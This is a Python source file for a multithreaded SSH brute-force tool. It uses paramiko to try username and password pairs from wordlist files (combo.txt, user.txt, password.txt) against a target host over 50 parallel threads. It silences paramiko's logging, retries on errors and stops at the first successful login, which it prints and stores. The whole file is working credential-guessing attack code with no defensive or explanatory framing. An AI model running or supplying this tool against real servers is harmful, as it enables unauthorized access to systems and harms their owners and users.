import logging
import socket
import threading
import paramiko
import concurrent.futures

logger = logging.getLogger("paramiko")
logger.setLevel(logging.CRITICAL)  # Suppress all but critical errors
while logger.hasHandlers():
    logger.removeHandler(logger.handlers[0])


class SSH_Client:
    def __init__(self, host: str, port: str) -> None:
        self.host, self.port = host, port

        self.stop_event = threading.Event()

        self.result = None

    def login(self, username, password, again):
        if self.stop_event.is_set():
            return False

        try:
            cli = paramiko.SSHClient()
            cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            cli.connect(
                hostname=self.host,
                port=self.port,
                username=username,
                password=password,
                allow_agent=False,
                look_for_keys=False,
                timeout=5,
                auth_timeout=5,
            )

            # If the connection is successful, print login details
            login = f"{self.host}:{self.port}:{username}:{password}"
            print("Login successful:", login)

            self.result = login

            self.stop_event.set()

            cli.close()
            return True

        except paramiko.AuthenticationException:
            print(f"Authentication failed for: {username}:{password}")
            return False
        except paramiko.SSHException as e:
            print(f"SSH Error for {username}:{password}")
            if again:
                self.login(username, password, False)
            return False
        except socket.timeout:
            print(f"Timeout occurred for {username}:{password}")
            return False
        except ConnectionResetError:
            print(f"Connection reset by peer for {username}:{password}")
            return False
        except Exception as e:
            if again:
                self.login(username, password, False)
            print(f"Unexpected error for {username}:{password}")
            return False

    def dictionary_attack(self):
        combo = []
        with open("./lists/combo.txt", "r") as f:
            combo = f.readlines()
            combo = [i.strip() for i in combo]

        user = []
        with open("./lists/user.txt", "r") as f:
            user = f.readlines()
            user = [i.strip() for i in user]

        password = []
        with open("./lists/password.txt", "r") as f:
            password = f.readlines()
            password = [i.strip() for i in password]

        print("Starting with combo")
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [
                executor.submit(self.login, i.split(":")[0], i.split(":")[1], True)
                for i in combo
            ]

            for future in concurrent.futures.as_completed(futures):
                future.result()

        print("Starting with user:pass")
        for i in user:
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                futures = [executor.submit(self.login, i, k, True) for k in password]

                for future in concurrent.futures.as_completed(futures):
                    future.result()
